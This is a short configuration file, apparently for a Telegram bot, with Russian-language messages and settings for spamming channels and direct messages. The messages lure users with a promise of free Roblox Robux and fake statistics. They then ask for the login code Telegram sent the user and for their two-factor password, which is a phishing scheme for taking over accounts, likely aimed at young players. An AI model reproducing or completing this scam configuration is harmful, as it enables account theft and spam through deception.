botToken = ""
spamInfo = {
    "joinChannels": [],
    "channelsSpam": [],
    "dmSpam": False,
    "spamText": ""
}
textInfo = {
    "startText": "👋 Привет\n\n🎈 Выдано робуксов: 575200\n🧾 Людей в очереди: 132\n🕐 Очередь(часы): ~24 часа\n🎇 Доступно робуксов сегодня: 500/500\n\nНажимайте на кнопку ниже, чтобы получить робуксы!\nНажимайте на кнопку ниже, чтобы получить робуксы!\nНажимайте на кнопку ниже, чтобы получить робуксы!",
    "connectionText": "⌚ Подключаемся к серверам роблокса...",
    "codeText": "📲Введите код, который вам отправил телеграмм(проверьте чаты)",
    "errorSendCodeText": "На ваш аккаунт нельзя получить Робуксы(",
    "validCodeText": "✅Успех! \n Мы нашли подходящий сервер, робуксы будут выданы 24 часа! \n \n Отправьте нам свой ник в игре🎁",
    "invalidCodeErrorText": "Код не верный!",
    "passwordNeedErrorText": "Введите ваш пароль 2фа:",
    "invalidPasswordError": "Вы ввели неверный пароль"
}